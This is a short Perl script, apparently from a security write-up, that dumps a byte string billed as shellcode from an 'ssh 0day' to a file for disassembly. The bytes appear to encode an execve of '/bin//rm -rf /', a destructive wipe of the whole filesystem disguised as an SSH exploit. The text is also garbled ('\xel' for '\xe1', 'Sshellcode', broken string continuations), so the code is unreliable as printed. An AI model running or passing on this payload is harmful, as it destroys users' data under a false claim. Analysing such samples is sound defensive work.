
#!/usr/bin/perl -w 
use strict; 

# This is the shellcode from HTZ #8 (txt only) ssh Oday 
my $shellcode = 

"\x6a\x0b\x58\x31\xf6\x56\x6a\x2f\x89\xe7\x56\ 
x66\x68\x2d\x66". 

"\x89\xe2\x56\x66\x68\x2d\x72\x89\xel\x56\x68\ 
x2f\x2f\x72\x6d". 

"\x68\x2f\x62\x69\x6e\x89\xe3\x56\x57\x52\x51\ 
x53\x89\xel\x31". 

"\xd2\xcd\x80"; 

open(FILE, "> shellcode.bin "); 
print FILE "Sshellcode" ; 
close(FILE)


# a simple perl app that will dump the shellcode
# to a file, [The resulting binary file will be
# called shellcode.bin], so that we can disassemble it.